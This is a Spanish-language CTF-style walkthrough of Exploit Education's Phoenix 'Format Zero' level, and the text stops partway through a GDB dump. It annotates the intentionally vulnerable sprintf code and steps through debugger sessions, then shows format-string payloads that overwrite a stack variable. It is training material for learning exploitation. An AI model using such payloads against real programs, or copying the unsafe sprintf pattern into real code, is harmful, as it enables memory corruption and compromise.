---
layout: single
title: "Format Zero"
permalink: /pwn/phoenix/format-zero/
parent: Phoenix
comments: true
excerpt: "Format Zero"
classes: wide
header:
  teaser: /assets/images/2025-08-29-Phoenix/logo.jpg
categories: [PWN]
tags: [PWN, Linux, Hacking, Easy]
---

![Untitled](/assets/images/2025-08-29-Phoenix/banner.png)

[Exploit Education > Phoenix > Format Zero](https://exploit.education/phoenix/format-zero/){:target="_blank"}

Este nivel introduce las cadenas de formato, y cómo las cadenas de formato suministradas por un atacante pueden modificar la ejecución del programa.

**Consejos:**

- man 3 printf
- Explotación de vulnerabilidades de cadenas de formato

## Análisis del código

El binario de **format-zero** nos da como objetivo modificar la variable `changeme`. El programa principal se ve de la siguiente manera:
puntos clave del código:

- La estructura `locals` contiene un **buffer de 32 bytes** y la variable `changeme`, que inicialmente vale **0**.
- La entrada del usuario se guarda en `buffer`, limitado a **15 caracteres** para evitar un *overflow*.
- El problema está en `sprintf(locals.dest, buffer);`: aquí `buffer` no se pasa como datos, sino como formato. Si el input contiene **especificadores de formato** (`%x`, `%s`, `%n`, etc.), `sprintf` los interpretará.
- Gracias a esto, podemos leer información de la pila e incluso modificar variables en memoria, como `changeme`.

```csharp
/*
 * phoenix/format-zero, by https://exploit.education
 *
 * Can you change the "changeme" variable?
 *
 * 0 bottles of beer on the wall, 0 bottles of beer! You take one down, and
 * pass it around, 4294967295 bottles of beer on the wall!
 */

#include <err.h>      // Proporciona la función errx() para mostrar errores y salir.
#include <stdio.h>    // Funciones estándar de entrada/salida (printf, fgets, sprintf...).
#include <stdlib.h>   // exit(), malloc() y otras utilidades.
#include <string.h>   // Manejo de strings: strlen, strcpy, etc.
#include <unistd.h>   // Funciones del sistema POSIX (aunque aquí casi no se usa).

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
// Macro que define un mensaje de bienvenida, insertando el nombre del nivel
// (LEVELNAME es definido al compilar).

int main(int argc, char **argv) {
  struct {
    char dest[32];        // Buffer de 32 bytes.
    volatile int changeme; // Variable que queremos modificar (marcada como volatile
                           // para evitar que el compilador la optimice).
  } locals;
  char buffer[16];        // Buffer temporal de 16 bytes para leer entrada del usuario.

  printf("%s\n", BANNER); // Muestra el mensaje de bienvenida.

  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
    errx(1, "Unable to get buffer");
  }
  // Lee como máximo 15 caracteres desde stdin (entrada estándar) y los guarda en "buffer".
  // Si falla la lectura, termina el programa con un error.
  buffer[15] = 0; // Se asegura de que el string esté terminado en NULL.

  locals.changeme = 0; // Inicializa "changeme" a 0.

  sprintf(locals.dest, buffer);
  // Aquí está la vulnerabilidad: sprintf() usa "buffer" como *formato*,
  // no solo como datos. Eso significa que si en nuestra entrada usamos
  // cosas como "%x" o "%n", el programa intentará interpretarlas.
  // => esto es una vulnerabilidad de Format String.

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
    // Si logramos modificar "changeme" desde la entrada, ganamos.
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
    // Mensaje si aún no hemos logrado modificar "changeme".
  }

  exit(0); // Termina el programa exitosamente.
}
```

Lo primero que hacemos es ejecutar el binario para observar su comportamiento inicial. El programa solicita un valor por entrada estándar y, tras ingresarlo, muestra un mensaje indicando que la variable `changeme` aún no ha sido modificada.

```csharp
user@phoenix-amd64:~$ /opt/phoenix/amd64/format-zero
Welcome to phoenix/format-zero, brought to you by https://exploit.education
A
Uh oh, 'changeme' has not yet been changed. Would you like to try again?

```

Ahora probamos qué sucede si enviamos más de 32 caracteres como entrada. Para ello, utilizamos un pequeño script en Python que genera 33 letras ‘A’ consecutivas y lo pasamos como parámetro al programa

```csharp
┌──(root㉿angussMoody)-[/mnt/angussMoody/pwn_the-ingredient-shop]
└─# python3 -c print"('A'*33)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Al enviar más de 32 caracteres como parámetro, la aplicación continúa mostrando el mismo mensaje de error. Esto confirma que, de acuerdo con el código, solo procesa una cantidad de caracteres, ignorando el resto de la entrada, como vimos en el código

```csharp
user@phoenix-amd64:~$ /opt/phoenix/amd64/format-zero
Welcome to phoenix/format-zero, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Uh oh, 'changeme' has not yet been changed. Would you like to try again?
user@phoenix-amd64:~$ 
```

Para entender mejor lo que ocurre, iniciamos el programa en el depurador. Primero listamos las funciones disponibles y luego desensamblamos la función `main`.

```csharp
user@phoenix-amd64:~$ gdb -q /opt/phoenix/amd64/format-zero
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/amd64/format-zero...(no debugging symbols found)...done.
gef➤  info func
All defined functions:

Non-debugging symbols:
0x00000000004004b0  _init
0x00000000004004d0  fgets@plt
0x00000000004004e0  puts@plt
0x00000000004004f0  errx@plt
0x0000000000400500  sprintf@plt
0x0000000000400510  exit@plt
0x0000000000400520  __libc_start_main@plt
0x0000000000400530  _start
0x0000000000400546  _start_c
0x0000000000400570  deregister_tm_clones
0x00000000004005a0  register_tm_clones
0x00000000004005e0  __do_global_dtors_aux
0x0000000000400670  frame_dummy
0x000000000040069d  main
0x0000000000400740  __do_global_ctors_aux
0x0000000000400782  _fini
gef➤  disass main
Dump of assembler code for function main:
   0x000000000040069d <+0>:	push   rbp
   0x000000000040069e <+1>:	mov    rbp,rsp
   0x00000000004006a1 <+4>:	sub    rsp,0x50
   0x00000000004006a5 <+8>:	mov    DWORD PTR [rbp-0x44],edi
   0x00000000004006a8 <+11>:	mov    QWORD PTR [rbp-0x50],rsi
   0x00000000004006ac <+15>:	mov    edi,0x400790
   0x00000000004006b1 <+20>:	call   0x4004e0 <puts@plt>
   0x00000000004006b6 <+25>:	mov    rdx,QWORD PTR [rip+0x200423]        # 0x600ae0 <stdin>
   0x00000000004006bd <+32>:	lea    rax,[rbp-0x40]
   0x00000000004006c1 <+36>:	mov    esi,0xf
   0x00000000004006c6 <+41>:	mov    rdi,rax
   0x00000000004006c9 <+44>:	call   0x4004d0 <fgets@plt>
   0x00000000004006ce <+49>:	test   rax,rax
   0x00000000004006d1 <+52>:	jne    0x4006e7 <main+74>
   0x00000000004006d3 <+54>:	mov    esi,0x4007dc
   0x00000000004006d8 <+59>:	mov    edi,0x1
   0x00000000004006dd <+64>:	mov    eax,0x0
   0x00000000004006e2 <+69>:	call   0x4004f0 <errx@plt>
   0x00000000004006e7 <+74>:	mov    BYTE PTR [rbp-0x31],0x0
   0x00000000004006eb <+78>:	mov    DWORD PTR [rbp-0x10],0x0
   0x00000000004006f2 <+85>:	lea    rdx,[rbp-0x40]
   0x00000000004006f6 <+89>:	lea    rax,[rbp-0x30]
   0x00000000004006fa <+93>:	mov    rsi,rdx
   0x00000000004006fd <+96>:	mov    rdi,rax
   0x0000000000400700 <+99>:	mov    eax,0x0
   0x0000000000400705 <+104>:	call   0x400500 <sprintf@plt>
   0x000000000040070a <+109>:	mov    eax,DWORD PTR [rbp-0x10]
   0x000000000040070d <+112>:	test   eax,eax
   0x000000000040070f <+114>:	je     0x40071d <main+128>
   0x0000000000400711 <+116>:	mov    edi,0x4007f8
   0x0000000000400716 <+121>:	call   0x4004e0 <puts@plt>
   0x000000000040071b <+126>:	jmp    0x400727 <main+138>
   0x000000000040071d <+128>:	mov    edi,0x400830
   0x0000000000400722 <+133>:	call   0x4004e0 <puts@plt>
   0x0000000000400727 <+138>:	mov    edi,0x0
   0x000000000040072c <+143>:	call   0x400510 <exit@plt>
End of assembler dump.

```

En este reto vamos a aprovechar para explicar algunos comandos de depuración. Lo primero es identificar partes clave de la función. En la instrucción `0x00000000004006bd <+32>: lea rax,[rbp-0x40]` se encuentra nuestro buffer. Luego, en `0x00000000004006c1 <+36>: mov esi,0xf` se establece un límite de 15 caracteres (0xf en hexadecimal equivale a 15 en decimal). Esto significa que realmente solo podemos ingresar 14 caracteres, ya que al final siempre se añade un `\0`. Con este análisis parecería imposible alcanzar los 32 caracteres necesarios para sobrescribir el buffer, dado que únicamente se copian 15 como máximo.
 
Estas instrucciones realizan la validación para comprobar si la variable `changeme` fue modificada. A partir de ellas podemos confirmar que la variable se encuentra en la dirección `rbp-0x10`.

`0x000000000040070a <+109>: mov    eax,DWORD PTR [rbp-0x10]
0x000000000040070d <+112>: test   eax,eax
0x000000000040070f <+114>: je     0x40071d <main+128>`

Con la información obtenida hasta ahora, vamos a establecer puntos de interrupción para observar el comportamiento del programa en los momentos clave. El primer *breakpoint* lo colocamos en `0x00000000004006f2 <+85>`, justo antes de preparar los registros para la llamada a `sprintf()`. El segundo lo ubicamos en `0x000000000040070a <+109>`, donde se carga en `eax` el valor de la variable `changeme` (almacenada en `rbp-0x10`) para verificar si fue modificada.

```csharp
gef➤  disass main
Dump of assembler code for function main:
   0x000000000040069d <+0>:	push   rbp
   0x000000000040069e <+1>:	mov    rbp,rsp
   0x00000000004006a1 <+4>:	sub    rsp,0x50
   0x00000000004006a5 <+8>:	mov    DWORD PTR [rbp-0x44],edi
   0x00000000004006a8 <+11>:	mov    QWORD PTR [rbp-0x50],rsi
   0x00000000004006ac <+15>:	mov    edi,0x400790
   0x00000000004006b1 <+20>:	call   0x4004e0 <puts@plt>
   0x00000000004006b6 <+25>:	mov    rdx,QWORD PTR [rip+0x200423]        # 0x600ae0 <stdin>
   0x00000000004006bd <+32>:	lea    rax,[rbp-0x40]
   0x00000000004006c1 <+36>:	mov    esi,0xf
   0x00000000004006c6 <+41>:	mov    rdi,rax
   0x00000000004006c9 <+44>:	call   0x4004d0 <fgets@plt>
   0x00000000004006ce <+49>:	test   rax,rax
   0x00000000004006d1 <+52>:	jne    0x4006e7 <main+74>
   0x00000000004006d3 <+54>:	mov    esi,0x4007dc
   0x00000000004006d8 <+59>:	mov    edi,0x1
   0x00000000004006dd <+64>:	mov    eax,0x0
   0x00000000004006e2 <+69>:	call   0x4004f0 <errx@plt>
   0x00000000004006e7 <+74>:	mov    BYTE PTR [rbp-0x31],0x0
   0x00000000004006eb <+78>:	mov    DWORD PTR [rbp-0x10],0x0
   0x00000000004006f2 <+85>:	lea    rdx,[rbp-0x40]
   0x00000000004006f6 <+89>:	lea    rax,[rbp-0x30]
   0x00000000004006fa <+93>:	mov    rsi,rdx
   0x00000000004006fd <+96>:	mov    rdi,rax
   0x0000000000400700 <+99>:	mov    eax,0x0
   0x0000000000400705 <+104>:	call   0x400500 <sprintf@plt>
   0x000000000040070a <+109>:	mov    eax,DWORD PTR [rbp-0x10]
   0x000000000040070d <+112>:	test   eax,eax
   0x000000000040070f <+114>:	je     0x40071d <main+128>
   0x0000000000400711 <+116>:	mov    edi,0x4007f8
   0x0000000000400716 <+121>:	call   0x4004e0 <puts@plt>
   0x000000000040071b <+126>:	jmp    0x400727 <main+138>
   0x000000000040071d <+128>:	mov    edi,0x400830
   0x0000000000400722 <+133>:	call   0x4004e0 <puts@plt>
   0x0000000000400727 <+138>:	mov    edi,0x0
   0x000000000040072c <+143>:	call   0x400510 <exit@plt>
End of assembler dump.
gef➤  b *0x00000000004006f2
Breakpoint 1 at 0x4006f2
gef➤  b *0x000000000040070a
Breakpoint 2 at 0x40070a
gef➤ 
```

Ejecutamos el programa dentro de `gdb` con el comando `r` y, como era de esperar, nos solicita el *input*. En este caso enviamos 16 caracteres (`AAAAAAAAAAAAAAAA`). El flujo se detiene en el primer *breakpoint* que habíamos configurado en `0x00000000004006f2 <+85>`

Podemos ver en los registros y la pila cómo quedó almacenada la cadena ingresada. El registro `$rax` apunta a nuestro *buffer* (`"AAAAAAAAAAAAAA"`), y en el *stack* se observan los valores `0x41` correspondientes a las letras `A`.

Esto confirma que la entrada se encuentra en la dirección `[rbp-0x40]`, que es precisamente donde se aloja el buffer definido en la función `main`.

```csharp
gef➤  r
Starting program: /opt/phoenix/amd64/format-zero 
Welcome to phoenix/format-zero, brought to you by https://exploit.education
AAAAAAAAAAAAAAAA

Breakpoint 1, 0x00000000004006f2 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffe630  →  "AAAAAAAAAAAAAA"
$rbx   : 0x00007fffffffe6c8  →  0x00007fffffffe8b8  →  "/opt/phoenix/amd64/format-zero"
$rcx   : 0x00007ffff7ffc538  →  0x000000000000000a
$rdx   : 0x0               
$rsp   : 0x00007fffffffe620  →  0x00007fffffffe6c8  →  0x00007fffffffe8b8  →  "/opt/phoenix/amd64/format-zero"
$rbp   : 0x00007fffffffe670  →  0x0000000000000001
$rsi   : 0x00007ffff7ffc536  →  0x00000000000a4141 ("AA"?)
$rdi   : 0x00007fffffffe63e  →  0x0000000000000000
$rip   : 0x00000000004006f2  →  <main+85> lea rdx, [rbp-0x40]
$r8    : 0x101010101010101 
$r9    : 0xa0a0a0a0a0a0a0a  ("\n\n\n\n\n\n\n\n"?)
$r10   : 0x8080808080808080
$r11   : 0x1               
$r12   : 0x00007fffffffe6d8  →  0x00007fffffffe8d7  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
$r13   : 0x000000000040069d  →  <main+0> push rbp
$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe620│+0x0000: 0x00007fffffffe6c8  →  0x00007fffffffe8b8  →  "/opt/phoenix/amd64/format-zero"	 ← $rsp
0x00007fffffffe628│+0x0008: 0x0000000100000000
0x00007fffffffe630│+0x0010: "AAAAAAAAAAAAAA"	 ← $rax
0x00007fffffffe638│+0x0018: 0x0000414141414141 ("AAAAAA"?)
0x00007fffffffe640│+0x0020: 0x0000000000000000
0x00007fffffffe648│+0x0028: 0x00007fffffffe6c8  →  0x00007fffffffe8b8  →  "/opt/phoenix/amd64/format-zero"
0x00007fffffffe650│+0x0030: 0x0000000000000001
0x00007fffffffe658│+0x0038: 0x00007fffffffe6d8  →  0x00007fffffffe8d7  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4006e2 <main+69>        call   0x4004f0 <errx@plt>
     0x4006e7 <main+74>        mov    BYTE PTR [rbp-0x31], 0x0
     0x4006eb <main+78>        mov    DWORD PTR [rbp-0x10], 0x0
 →   0x4006f2 <main+85>        lea    rdx, [rbp-0x40]
     0x4006f6 <main+89>        lea    rax, [rbp-0x30]
     0x4006fa <main+93>        mov    rsi, rdx
     0x4006fd <main+96>        mov    rdi, rax
     0x400700 <main+99>        mov    eax, 0x0
     0x400705 <main+104>       call   0x400500 <sprintf@plt>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "format-zero", stopped, reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006f2 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

En este punto se identifican las direcciones en memoria tanto del buffer como de la variable `changeme`. Al inspeccionar con GDB, se observa que el buffer comienza en la dirección `0x7fffffffe640` (`$rbp-0x30`), mientras que la variable `changeme` se encuentra en `0x7fffffffe660` (`$rbp-0x10`). Esto confirma que `changeme` está ubicada 32 bytes después del inicio del buffer, lo que indica que con un overflow controlado sobre el buffer podemos alcanzar y modificar su valor

```csharp
gef➤  p $rbp-0x30
$1 = (void *) 0x7fffffffe640
gef➤  p $rbp-0x10
$2 = (void *) 0x7fffffffe660

```

Al inspeccionar la pila, observamos que tanto el buffer como la variable `changeme` se encuentran en cero. Esto confirma que aún no se ha realizado ninguna escritura sobre estas posiciones de memoria y que el estado inicial del programa está limpio antes de ejecutar la explotación

```csharp
gef➤  x/8xg $rbp-0x30
0x7fffffffe640:	0x0000000000000000	0x00007fffffffe6c8
0x7fffffffe650:	0x0000000000000001	0x00007fffffffe6d8
0x7fffffffe660:	0x0000000000000000	0x0000000000000000
0x7fffffffe670:	0x0000000000000001	0x00007ffff7d8fd62
gef➤ 
```

Con el comando `c` dejamos que la ejecución continúe hasta el segundo breakpoint. Al inspeccionar la memoria podemos ver que el buffer ahora contiene las 14 `A` ingresadas, tal como lo esperábamos, mientras que la variable `changeme` permanece en cero, confirmando que aún no ha sido modificada

```csharp
gef➤  c
Continuing.

Breakpoint 2, 0x000000000040070a in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xe               
$rbx   : 0x00007fffffffe6c8  →  0x00007fffffffe8b8  →  "/opt/phoenix/amd64/format-zero"
$rcx   : 0x0               
$rdx   : 0xffffffff        
$rsp   : 0x00007fffffffe620  →  0x00007fffffffe6c8  →  0x00007fffffffe8b8  →  "/opt/phoenix/amd64/format-zero"
$rbp   : 0x00007fffffffe670  →  0x0000000000000001
$rsi   : 0x00007fffffffe30e  →  0x0000000000900000
$rdi   : 0x00007fffffffe64e  →  0x0000000000010000
$rip   : 0x000000000040070a  →  <main+109> mov eax, DWORD PTR [rbp-0x10]
$r8    : 0x00007fffffffe2d8  →  0x0000000000000000
$r9    : 0x00007fffffffe630  →  "AAAAAAAAAAAAAA"
$r10   : 0x8080808080808080
$r11   : 0x1               
$r12   : 0x00007fffffffe6d8  →  0x00007fffffffe8d7  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
$r13   : 0x000000000040069d  →  <main+0> push rbp
$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe620│+0x0000: 0x00007fffffffe6c8  →  0x00007fffffffe8b8  →  "/opt/phoenix/amd64/format-zero"	 ← $rsp
0x00007fffffffe628│+0x0008: 0x0000000100000000
0x00007fffffffe630│+0x0010: "AAAAAAAAAAAAAA"	 ← $r9
0x00007fffffffe638│+0x0018: 0x0000414141414141 ("AAAAAA"?)
0x00007fffffffe640│+0x0020: "AAAAAAAAAAAAAA"
0x00007fffffffe648│+0x0028: 0x0000414141414141 ("AAAAAA"?)
0x00007fffffffe650│+0x0030: 0x0000000000000001
0x00007fffffffe658│+0x0038: 0x00007fffffffe6d8  →  0x00007fffffffe8d7  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4006fd <main+96>        mov    rdi, rax
     0x400700 <main+99>        mov    eax, 0x0
     0x400705 <main+104>       call   0x400500 <sprintf@plt>
 →   0x40070a <main+109>       mov    eax, DWORD PTR [rbp-0x10]
     0x40070d <main+112>       test   eax, eax
     0x40070f <main+114>       je     0x40071d <main+128>
     0x400711 <main+116>       mov    edi, 0x4007f8
     0x400716 <main+121>       call   0x4004e0 <puts@plt>
     0x40071b <main+126>       jmp    0x400727 <main+138>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "format-zero", stopped, reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40070a → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/8xg $rbp-0x30
0x7fffffffe640:	0x4141414141414141	0x0000414141414141
0x7fffffffe650:	0x0000000000000001	0x00007fffffffe6d8
0x7fffffffe660:	0x0000000000000000	0x0000000000000000
0x7fffffffe670:	0x0000000000000001	0x00007ffff7d8fd62
gef➤  
```

Como ya sabemos, de esta forma no lograremos modificar la variable. Al continuar la ejecución con `c`, el programa termina y muestra el mensaje indicando que `changeme` no ha sido alterada, confirmando que el intento actual no es suficiente para cumplir el objetivo

```csharp
gef➤  c
Continuing.
Uh oh, 'changeme' has not yet been changed. Would you like to try again?
[Inferior 1 (process 372) exited normally]
gef➤
```

 
La vulnerabilidad se encuentra en el uso inseguro de cadenas de formato (format string). Para comprenderlo mejor, consideremos el siguiente ejemplo: si se ejecuta un `printf` con especificadores de formato sin los argumentos correspondientes, en lugar de mostrar un texto legible, el programa imprimirá valores en hexadecimal que corresponden a direcciones o datos almacenados en la pila durante la ejecución. Esto ocurre porque la función `printf` interpreta cada especificador de formato (`%x`) como si existieran parámetros adicionales, aunque en realidad no los haya. Como resultado, el programa accede y revela contenido arbitrario de la memoria. Por ejemplo
 
En este caso, cada `%x` provoca la lectura de 4 bytes de la pila (representados como 8 caracteres en hexadecimal), exponiendo información sensible de la memoria

```csharp
int main() {
	printf("%x.%x.%x");
}
# output: d0a8b868 d0a8b878 3c43b1b0
```

Ahora probamos la explotación introduciendo la cadena `%x%x%x%xAAAA` como entrada. Esto provoca que el programa empiece a leer y mostrar posiciones de memoria de la pila a través de los especificadores de formato, y al final podemos observar que las letras `AAAA` también quedan reflejadas en el buffer. Esto confirma que podemos inyectar tanto especificadores de formato como valores arbitrarios dentro del buffer, lo que será clave para modificar la variable `changeme`

```csharp
gef➤  r
Starting program: /opt/phoenix/amd64/format-zero 
Welcome to phoenix/format-zero, brought to you by https://exploit.education
%x%x%x%xAAAA

Breakpoint 1, 0x00000000004006f2 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffe630  →  "%x%x%x%xAAAA"
$rbx   : 0x00007fffffffe6c8  →  0x00007fffffffe8b8  →  "/opt/phoenix/amd64/format-zero"
$rcx   : 0x00007ffff7ffc534  →  0x000000000000000a
$rdx   : 0x0               
$rsp   : 0x00007fffffffe620  →  0x00007fffffffe6c8  →  0x00007fffffffe8b8  →  "/opt/phoenix/amd64/format-zero"
$rbp   : 0x00007fffffffe670  →  0x0000000000000001
$rsi   : 0x00007ffff7ffc535  →  0x0000000000000000
$rdi   : 0x00007fffffffe63d  →  0x0000000000000000
$rip   : 0x00000000004006f2  →  <main+85> lea rdx, [rbp-0x40]
$r8    : 0x101010101010101 
$r9    : 0xa0a0a0a0a0a0a0a  ("\n\n\n\n\n\n\n\n"?)
$r10   : 0x1               
$r11   : 0x246             
$r12   : 0x00007fffffffe6d8  →  0x00007fffffffe8d7  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
$r13   : 0x000000000040069d  →  <main+0> push rbp
$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe620│+0x0000: 0x00007fffffffe6c8  →  0x00007fffffffe8b8  →  "/opt/phoenix/amd64/format-zero"	 ← $rsp
0x00007fffffffe628│+0x0008: 0x0000000100000000
0x00007fffffffe630│+0x0010: "%x%x%x%xAAAA"	 ← $rax
0x00007fffffffe638│+0x0018: 0x0000000a41414141 ("AAAA"?)
0x00007fffffffe640│+0x0020: 0x0000000000000000
0x00007fffffffe648│+0x0028: 0x00007fffffffe6c8  →  0x00007fffffffe8b8  →  "/opt/phoenix/amd64/format-zero"
0x00007fffffffe650│+0x0030: 0x0000000000000001
0x00007fffffffe658│+0x0038: 0x00007fffffffe6d8  →  0x00007fffffffe8d7  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4006e2 <main+69>        call   0x4004f0 <errx@plt>
     0x4006e7 <main+74>        mov    BYTE PTR [rbp-0x31], 0x0
     0x4006eb <main+78>        mov    DWORD PTR [rbp-0x10], 0x0
 →   0x4006f2 <main+85>        lea    rdx, [rbp-0x40]
     0x4006f6 <main+89>        lea    rax, [rbp-0x30]
     0x4006fa <main+93>        mov    rsi, rdx
     0x4006fd <main+96>        mov    rdi, rax
     0x400700 <main+99>        mov    eax, 0x0
     0x400705 <main+104>       call   0x400500 <sprintf@plt>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "format-zero", stopped, reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006f2 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```

Al ejecutar el programa con el comando `c` observamos que el flujo continúa y se verifica la condición de la variable `changeme`. En este punto, al inspeccionar el contenido del buffer con `x/8xg $rbp-0x30`, podemos comprobar que la sobreescritura fue exitosa: la variable fue modificada con los valores inyectados en el buffer. Esto confirma que el desbordamiento de pila no solo altera el contenido de memoria cercano, sino que también permite manipular variables críticas como `changeme`.

```csharp
gef➤  x/8xg $rbp-0x30
0x7fffffffe640:	0x3033366566666666	0x3433356366663766
0x7fffffffe650:	0x6131303130313031	0x4141613061306130
0x7fffffffe660:	0x00000000000a4141	0x0000000000000000
0x7fffffffe670:	0x0000000000000001	0x00007ffff7d8fd62
gef➤ 
```

Al continuar la ejecución con el comando `c`, el programa muestra el mensaje que confirma que el reto se ha cumplido, ya que la variable `changeme` fue modificada correctamente

```csharp
gef➤  c
Continuing.
Well done, the 'changeme' variable has been changed!
[Inferior 1 (process 381) exited normally]
gef➤ 
```

Al ejecutar el binario directamente comprobamos que el reto se completa exitosamente

```csharp
user@phoenix-amd64:~$ /opt/phoenix/amd64/format-zero 
Welcome to phoenix/format-zero, brought to you by https://exploit.education
%x%x%x%xAAAA
Well done, the 'changeme' variable has been changed!
user@phoenix-amd64:~$
```

Otra forma de resolverlo es utilizando el payload `%32xAAAA`, que fuerza a `printf` a imprimir 32 caracteres en hexadecimal antes de colocar las `A` lo que puede hacer que se modifique la variable`changeme`

```csharp
gef➤  r
Starting program: /opt/phoenix/amd64/format-zero 
Welcome to phoenix/format-zero, brought to you by https://exploit.education
%32xAAAA

Breakpoint 1, 0x00000000004006f2 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffe630  →  "%32xAAAA"
$rbx   : 0x00007fffffffe6c8  →  0x00007fffffffe8b8  →  "/opt/phoenix/amd64/format-zero"
$rcx   : 0x00007ffff7ffc530  →  0x000000000000000a
$rdx   : 0x0               
$rsp   : 0x00007fffffffe620  →  0x00007fffffffe6c8  →  0x00007fffffffe8b8  →  "/opt/phoenix/amd64/format-zero"
$rbp   : 0x00007fffffffe670  →  0x0000000000000001
$rsi   : 0x00007ffff7ffc531  →  0x0000000000000000
$rdi   : 0x00007fffffffe639  →  0x0000000000000000
$rip   : 0x00000000004006f2  →  <main+85> lea rdx, [rbp-0x40]
$r8    : 0x00007ffff7ffb300  →  0x0000000000000005
$r9    : 0x00007fffffffe5ef  →  0x007fffffffe67000
$r10   : 0x1               
$r11   : 0x246             
$r12   : 0x00007fffffffe6d8  →  0x00007fffffffe8d7  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
$r13   : 0x000000000040069d  →  <main+0> push rbp
$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe620│+0x0000: 0x00007fffffffe6c8  →  0x00007fffffffe8b8  →  "/opt/phoenix/amd64/format-zero"	 ← $rsp
0x00007fffffffe628│+0x0008: 0x0000000100000000
0x00007fffffffe630│+0x0010: "%32xAAAA"	 ← $rax
0x00007fffffffe638│+0x0018: 0x000000000000000a
0x00007fffffffe640│+0x0020: 0x0000000000000000
0x00007fffffffe648│+0x0028: 0x00007fffffffe6c8  →  0x00007fffffffe8b8  →  "/opt/phoenix/amd64/format-zero"
0x00007fffffffe650│+0x0030: 0x0000000000000001
0x00007fffffffe658│+0x0038: 0x00007fffffffe6d8  →  0x00007fffffffe8d7  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4006e2 <main+69>        call   0x4004f0 <errx@plt>
     0x4006e7 <main+74>        mov    BYTE PTR [rbp-0x31], 0x0
     0x4006eb <main+78>        mov    DWORD PTR [rbp-0x10], 0x0
 →   0x4006f2 <main+85>        lea    rdx, [rbp-0x40]
     0x4006f6 <main+89>        lea    rax, [rbp-0x30]
